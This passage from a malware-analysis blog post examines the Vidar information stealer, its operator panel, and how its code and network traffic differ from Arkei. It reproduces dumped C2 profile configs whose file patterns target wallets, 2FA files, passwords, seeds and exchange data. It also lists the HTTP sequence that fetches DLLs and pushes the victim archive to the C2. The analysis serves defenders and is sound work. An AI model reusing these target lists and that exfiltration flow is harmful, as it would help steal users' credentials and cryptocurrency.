<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="451" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/ultra_hacks_services/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_services.png?fit=1109%2C650&amp;ssl=1" data-orig-size="1109,650" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ultra_hacks_services" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_services.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_services.png?fit=900%2C527&amp;ssl=1" class="alignnone size-full wp-image-451" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_services.png?resize=900%2C528&#038;ssl=1" alt="ultra_hacks_services" width="900" height="528" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_services.png?w=1109&amp;ssl=1 1109w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_services.png?resize=300%2C176&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_services.png?resize=768%2C450&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_services.png?resize=1024%2C600&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_services.png?resize=1100%2C645&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p><em><strong>Settings</strong></em></p>
<p>The most important tab is obviously where it is possible to configure the payload, for grabbing some additional stuff on the machine with the profiles. Activate or deactivate some features to filtering the stealer for really specific purposes.</p>
<p>It&#8217;s also important to notify, that it&#8217;s possible with Vidar to deploy multiple profiles at the same time. It means when the payload is infecting the victim machine, X archive for X profile is saved in &#8220;files&#8221; repository. The customer could be able to sort easily for malicious purposes after the grabbed data.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="452" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/ultra_hacks_settings/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_settings.png?fit=1112%2C497&amp;ssl=1" data-orig-size="1112,497" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ultra_hacks_settings" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_settings.png?fit=300%2C134&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_settings.png?fit=900%2C403&amp;ssl=1" class="alignnone size-full wp-image-452" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_settings.png?resize=900%2C402&#038;ssl=1" alt="ultra_hacks_settings" width="900" height="402" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_settings.png?w=1112&amp;ssl=1 1112w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_settings.png?resize=300%2C134&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_settings.png?resize=768%2C343&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_settings.png?resize=1024%2C458&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/ultra_hacks_settings.png?resize=1100%2C492&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>When editing or creating a new rule, we have this prompt panel appearing and this is in relation with what explained above with all possible path that the malware is able to search with the selected files.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="501" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_edit_rule/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_edit_rule.png?fit=625%2C581&amp;ssl=1" data-orig-size="625,581" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_edit_rule" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_edit_rule.png?fit=300%2C279&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_edit_rule.png?fit=625%2C581&amp;ssl=1" class=" size-full wp-image-501 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_edit_rule.png?resize=625%2C581&#038;ssl=1" alt="vidar_edit_rule" width="625" height="581" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_edit_rule.png?w=625&amp;ssl=1 625w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_edit_rule.png?resize=300%2C279&amp;ssl=1 300w" sizes="auto, (max-width: 625px) 100vw, 625px" /></p>
<p>After checking a little, there is plenty of profiles on the C2. This is what we could found:</p>
<p>Default empty config:</p>
<pre>1,1,1,1,1,1,1,1,0,1,250,none;</pre>
<p>Default initialized config:</p>
<pre>1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;</pre>
<p>Examples of custom profiles:</p>
<pre>1,1,1,1,1,1,1,1,1,1,250,grabba;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;100;true;movies:music:mp3;
1,1,0,1,1,1,1,1,1,1,250,инфа;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
1,1,1,1,1,1,1,1,1,1,250,Первое;%DESKTOP%\;*.txt:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*;50;true;movies:music:mp3;
1,1,1,1,1,1,1,1,1,1,250,123435566;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;
1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;</pre>
<p>There are also some possibilities to see multiple profiles executed at the same time.</p>
<pre>1,1,1,1,1,1,0,1,1,1,250,
<strong><span style="color: #ff0000;">DESKTOP</span></strong>;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*2fa*.png:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*:*okex*.*:*binance*.*:*bitfinex*.*:*bittrex*.*:*gdax*.*:*private*.*:*upbit*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kucoin*.*:*API*.*:*huobi*.*:*coinigy*.*:*jaxx*.*:*electrum*.*:*exodus*.*:*neo*.*:*yobit*.*:*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*;100;true;movies:music:mp3:dll;
<strong><span style="color: #ff0000;">DOCUMENTS</span></strong>;%DOCUMENTS%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*:*okex*.*:*binance*.*:*bitfinex*.*:*bittrex*.*:*gdax*.*:*private*.*:*upbit*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kucoin*.*:*API*.*:*huobi*.*:*coinigy*.*:*jaxx*.*:*electrum*.*:*exodus*.*:*neo*.*:*yobit*.*:*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*;100;true;movies:music:mp3:dll;
<span style="color: #ff0000;"><strong>DRIVE_REMOVABLE</strong></span>;%DRIVE_REMOVABLE%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*:*okex*.*:*binance*.*:*bitfinex*.*:*bittrex*.*:*gdax*.*:*private*.*:*upbit*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*.*:*kucoin*.*:*API*.*:*huobi*.*:*coinigy*.*:*jaxx*.*:*electrum*.*:*exodus*.*:*neo*.*:*yobit*.*:*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*crypt*.*:*key*.*:*seed*.*:*pass*.*:*btc*.*:*coin*.*:*poloniex*.*:*kraken*.*:*cex*.*;100;true;movies:music:mp3:dll;</pre>
<p>they are in fact Delimited with the specific format, as detailed as above. So here, we have 3 profiles :</p>
<ul>
<li>DESKTOP</li>
<li>DOCUMENTS</li>
<li>DRIVE_REMOVABLE</li>
</ul>
<p>that will be stored into there respectively archives into &#8220;files&#8221; repository.</p>
<p><em>e.d: All dumped profiles are available on <a href="https://github.com/Fmk0/work/tree/master/Vidar">my GitHub repository</a>.</em></p>
<p>Finally, with this quick analysis of the panel, something that is more and more common nowadays with a stealer, a loader feature, for pushing other malware.</p>
<p>As mentioned in the introduction, this is a shop where customers will just have to deal to configure their malware, everything is managed by a team (?) behind for the maintenance and for avoiding proxy filtering stuff, domains are changed regularly (it&#8217;s also easy to check this on the samples, because it looks like a new version means a new generated domain).</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="506" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_infos_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos_02.png?fit=1500%2C374&amp;ssl=1" data-orig-size="1500,374" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_infos_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos_02.png?fit=300%2C75&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos_02.png?fit=900%2C224&amp;ssl=1" class="alignnone size-full wp-image-506" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos_02.png?resize=900%2C224&#038;ssl=1" alt="vidar_infos_02" width="900" height="224" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos_02.png?w=1500&amp;ssl=1 1500w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos_02.png?resize=300%2C75&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos_02.png?resize=768%2C191&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos_02.png?resize=1024%2C255&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos_02.png?resize=1100%2C274&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>Also, there is some possibility (of what they said) to have a 2FA Authentication to their account page.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="505" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_infos/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos.png?fit=1450%2C332&amp;ssl=1" data-orig-size="1450,332" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_infos" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos.png?fit=300%2C69&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos.png?fit=900%2C206&amp;ssl=1" class="alignnone size-full wp-image-505" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos.png?resize=900%2C206&#038;ssl=1" alt="vidar_infos" width="900" height="206" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos.png?w=1450&amp;ssl=1 1450w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos.png?resize=300%2C69&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos.png?resize=768%2C176&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos.png?resize=1024%2C234&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_infos.png?resize=1100%2C252&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h3>Some fancy message</h3>
<p>if we are searching for some stuff with the login panel, with have some sympathetic message.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="457" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_https/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_https.png?fit=812%2C282&amp;ssl=1" data-orig-size="812,282" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_https" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_https.png?fit=300%2C104&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_https.png?fit=812%2C282&amp;ssl=1" class="alignnone size-full wp-image-457" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_https.png?resize=812%2C282&#038;ssl=1" alt="vidar_https" width="812" height="282" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_https.png?w=812&amp;ssl=1 812w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_https.png?resize=300%2C104&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_https.png?resize=768%2C267&amp;ssl=1 768w" sizes="auto, (max-width: 812px) 100vw, 812px" /></p>
<p>Let&#8217;s see what we have behind 🙂</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="456" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_easter_egg/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_easter_egg.png?fit=975%2C891&amp;ssl=1" data-orig-size="975,891" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_easter_egg" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_easter_egg.png?fit=300%2C274&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_easter_egg.png?fit=900%2C822&amp;ssl=1" class="alignnone size-full wp-image-456" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_easter_egg.png?resize=900%2C822&#038;ssl=1" alt="vidar_easter_egg.png" width="900" height="822" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_easter_egg.png?w=975&amp;ssl=1 975w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_easter_egg.png?resize=300%2C274&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_easter_egg.png?resize=768%2C702&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>A kind of easter egg to remind us what is the signification of Vidar: &#8220;the God of Vengeance&#8221; in Nordic mythology.</p>
<h2>Vidar &#8211; An Arkei copycat?</h2>
<p>If we are looking to requests and code, Vidar is almost identical to Arkei. There is slightly some differences at some point but all implemented features are the same. This could lose some blue team people if they don&#8217;t make too much attention to it on sandbox results. Current Yara rules will trigger Vidar as Arkei, so automated assignations lead to mistakes at the moment of this review. Analyzing the code is mandatory here to understand what&#8217;s goin&#8217; on.</p>
<p>At first, the main function for both of them is similar :</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="454" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/main_arkei_vidar/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Main_Arkei_Vidar.png?fit=480%2C739&amp;ssl=1" data-orig-size="480,739" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Main_Arkei_Vidar" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Main_Arkei_Vidar.png?fit=195%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Main_Arkei_Vidar.png?fit=480%2C739&amp;ssl=1" class=" size-full wp-image-454 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Main_Arkei_Vidar.png?resize=480%2C739&#038;ssl=1" alt="Main_Arkei_Vidar" width="480" height="739" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Main_Arkei_Vidar.png?w=480&amp;ssl=1 480w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Main_Arkei_Vidar.png?resize=195%2C300&amp;ssl=1 195w" sizes="auto, (max-width: 480px) 100vw, 480px" /></p>
<p>The archive generation is also the same, so this is not with this information that it&#8217;s possible to differentiate these two malware.</p>
<h3>Code differences</h3>
<p>An easy to know if we are dealing with Vidar is to find &#8220;Vidar.cpp&#8221;.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="461" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidarcpp/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/VidarCpp.png?fit=621%2C177&amp;ssl=1" data-orig-size="621,177" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="VidarCpp" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/VidarCpp.png?fit=300%2C86&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/VidarCpp.png?fit=621%2C177&amp;ssl=1" class=" size-full wp-image-461 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/VidarCpp.png?resize=621%2C177&#038;ssl=1" alt="VidarCpp" width="621" height="177" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/VidarCpp.png?w=621&amp;ssl=1 621w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/VidarCpp.png?resize=300%2C86&amp;ssl=1 300w" sizes="auto, (max-width: 621px) 100vw, 621px" /></p>
<p><em><strong>Vidar Signature</strong></em></p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="475" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_arkei_signature_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature_02.png?fit=1125%2C534&amp;ssl=1" data-orig-size="1125,534" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_arkei_signature_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature_02.png?fit=300%2C142&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature_02.png?fit=900%2C427&amp;ssl=1" class="alignnone size-full wp-image-475" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature_02.png?resize=900%2C427&#038;ssl=1" alt="vidar_arkei_signature_02" width="900" height="427" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature_02.png?w=1125&amp;ssl=1 1125w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature_02.png?resize=300%2C142&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature_02.png?resize=768%2C365&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature_02.png?resize=1024%2C486&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature_02.png?resize=1100%2C522&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p><em><strong>Arkei signature</strong></em></p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="474" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_arkei_signature/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature.png?fit=1679%2C810&amp;ssl=1" data-orig-size="1679,810" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_arkei_signature" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature.png?fit=300%2C145&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature.png?fit=900%2C434&amp;ssl=1" class="alignnone size-full wp-image-474" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature.png?resize=900%2C434&#038;ssl=1" alt="vidar_arkei_signature" width="900" height="434" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature.png?w=1679&amp;ssl=1 1679w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature.png?resize=300%2C145&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature.png?resize=768%2C371&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature.png?resize=1024%2C494&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_arkei_signature.png?resize=1100%2C531&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h3>Network differences</h3>
<p>An analyst can be dupe easily with the requests and thinking that we have another form of HTTP requests with Arkei, but it&#8217;s not.</p>
<p><strong><em>Vidar HTTP Requests</em></strong></p>
<pre>/ (i.e 162)    &lt;- Config
ip-api.com/line/    &lt;- Get Network Info
/msvcp140.dll       &lt;- Required DLL
/nss3.dll           &lt;- Required DLL
/softokn3.dll       &lt;- Required DLL
/vcruntime140.dll   &lt;- Required DLL
/                   &lt;- Pushing Victim Archive to C2</pre>
<p>there are no libraries downloaded on Arkei, this is something really specific to Vidar, for some parts of the stealing process.</p>
<p><strong><em>Arkei HTTP Requests</em></strong></p>
<pre>/index.php        &lt;- Config
ip-api.com/line/  &lt;- Get Network Info
/index.php        &lt;- Pushing Victim Archive to C2</pre>
<p><strong><em>Config Format</em></strong></p>
